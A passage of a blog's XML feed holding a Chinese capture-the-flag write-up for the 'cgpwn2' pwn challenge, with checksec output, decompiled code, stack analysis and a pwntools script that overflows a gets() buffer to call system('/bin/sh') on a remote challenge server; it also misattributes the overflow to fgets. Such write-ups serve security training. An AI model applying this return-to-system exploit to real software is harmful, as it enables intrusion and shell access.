        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>cgpwn2</title>
    <link href="http://yoursite.com/2019/07/27/cgpwn2/"/>
    <id>http://yoursite.com/2019/07/27/cgpwn2/</id>
    <published>2019-07-27T06:48:01.768Z</published>
    <updated>2019-07-27T07:02:13.784Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec cgpwn2</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/cgpwn2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">   只开启了nx保护</span><br><span class="line"></span><br><span class="line"> ida分析</span><br><span class="line"> char *hello()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // eax</span><br><span class="line">  signed int v1; // ebx</span><br><span class="line">  unsigned int v2; // ecx</span><br><span class="line">  char *v3; // eax</span><br><span class="line">  char s; // [esp+12h] [ebp-26h]</span><br><span class="line">  int v6; // [esp+14h] [ebp-24h]</span><br><span class="line"></span><br><span class="line">  v0 = &amp;s;</span><br><span class="line">  v1 = 30;</span><br><span class="line">  <span class="keyword">if</span> ( (unsigned int)&amp;s &amp; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)&amp;s = 0;</span><br><span class="line">    v0 = (char *)&amp;v6;</span><br><span class="line">    v1 = 28;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = 0;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)&amp;v0[v2] = 0;</span><br><span class="line">    v2 += 4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; (v1 &amp; 0xFFFFFFFC) );</span><br><span class="line">  v3 = &amp;v0[v2];</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)v3 = 0;</span><br><span class="line">    v3 += 2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; 1 )</span><br><span class="line">    *v3 = 0;</span><br><span class="line">  puts(<span class="string">"please tell me your name"</span>);</span><br><span class="line">  fgets(name, 50, stdin);</span><br><span class="line">  puts(<span class="string">"hello,you can leave some message here:"</span>);</span><br><span class="line">  <span class="built_in">return</span> gets(&amp;s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fgets(name, 50, stdin); 栈溢出漏洞</span><br><span class="line"></span><br><span class="line">.bss:0804A080 name            db 34h dup(?)           ; DATA XREF: hello+77↑o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br><span class="line">.bss:0804A080</span><br><span class="line"></span><br><span class="line">name 在bss段可以写入/bin/sh</span><br><span class="line"></span><br><span class="line">int pwn()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">return</span> system(<span class="string">"echo hehehe"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">有system但是没有/bin/sh 需要自己写入</span><br><span class="line"></span><br><span class="line">00000026 s               db ?</span><br><span class="line">-00000025                 db ? ; undefined</span><br><span class="line">-00000024                 db ? ; undefined</span><br><span class="line">-00000023                 db ? ; undefined</span><br><span class="line">.................</span><br><span class="line">00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line"></span><br><span class="line">溢出字节位42字节</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在找关键字符串的时候没有发现 bin/sh 。所以我们需要将bin/sh写到我们可以访问的地址中去。我们可以在输入name的时候把 bin/sh写进去。name位于bss段，bss段保存全局变量，加载地址不会因为地址随机化的开启而有所变化。</span><br><span class="line"></span><br><span class="line">将 system 的地址写到 hello 函数的返回地址中，同时将之前 bin/sh 的地址也写到栈中，作为system函数的参数</span><br></pre></td></tr></table></figure><h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">普通的栈溢出攻击 有system但是没有/bin/sh</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,48164)</span><br><span class="line">bin_sh_addr=0x0804A080</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">system_addr=0x08048420</span><br><span class="line">payload=<span class="string">'a'</span>*0x26+<span class="string">'a'</span>*4+p32(system_addr)+p32(system_addr)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
</feed>
